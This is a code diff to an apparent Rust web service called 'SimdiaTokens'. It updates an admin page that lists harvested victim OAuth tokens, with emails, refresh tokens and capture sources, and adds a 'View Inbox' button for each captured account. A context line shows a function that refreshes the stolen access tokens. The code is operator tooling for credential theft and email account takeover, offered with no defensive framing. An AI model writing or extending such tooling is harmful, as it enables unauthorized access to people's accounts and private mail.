@@ -194,17 +194,31 @@ async fn refresh_access_token(state: &AppState, refresh_token: &str) -> Option<S
     body.get("access_token").and_then(|v| v.as_str()).map(|s| s.to_string())
 }
 
-// HTML admin dashboard (fallback)
+
+// HTML admin dashboard (with View Inbox button)
 async fn admin_dashboard(state: web::Data<AppState>) -> impl Responder {
     let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source FROM harvested ORDER BY captured_at DESC")
         .fetch_all(&state.pool)
         .await
         .unwrap_or_default();
-    let mut html = String::from(r#"<!DOCTYPE html><html><head><title>SimdiaTokens Admin</title><style>body{font-family:Arial;background:#1a1a2e;color:#eee;padding:20px;}table{width:100%;border-collapse:collapse;}th,td{padding:10px;border-bottom:1px solid #333;}</style></head><body><h1>SimdiaTokens Harvested Tokens</h1><table><tr><th>ID</th><th>Email</th><th>Refresh Token</th><th>Expires</th><th>Source</th></tr>"#);
+    let mut html = String::from(r#"<!DOCTYPE html><html><head><title>SimdiaTokens Admin</title><style>
+        body{font-family:Arial;background:#1a1a2e;color:#eee;padding:20px;}
+        table{width:100%;border-collapse:collapse;}
+        th,td{padding:10px;border-bottom:1px solid #333;}
+        .token{font-family:monospace;font-size:12px;}
+        button{background:#0078d4;color:#fff;border:none;padding:5px 10px;border-radius:4px;cursor:pointer;}
+        button:hover{background:#005a9e;}
+        a{text-decoration:none;}
+    </style></head><body><h1>SimdiaTokens Harvested Tokens</h1>
+    <table><tr><th>ID</th><th>Email</th><th>Refresh Token</th><th>Expires</th><th>Source</th><th>Actions</th></tr>"#);
     for token in rows {
         let email = token.email.as_deref().unwrap_or("unknown");
         let refresh_short = if token.refresh_token.len() > 20 { format!("{}...", &token.refresh_token[..20]) } else { token.refresh_token.clone() };
-        html.push_str(&format!("<tr><td>{}</td><td>{}</td><td>{}</td><td>{}</td><td>{}</td></tr>", token.id, email, refresh_short, token.expires_at, token.source));
+        html.push_str(&format!(
+            r#"<tr><td>{}</td><td>{}</td><td class='token'>{}</td><td>{}</td><td>{}</td>
+            <td><a href='/inbox_view?token_id={}'><button>📧 View Inbox</button></a></td></tr>"#,
+            token.id, email, refresh_short, token.expires_at, token.source, token.id
+        ));
     }
     html.push_str("</table></body></html>");
     HttpResponse::Ok().content_type("text/html").body(html)
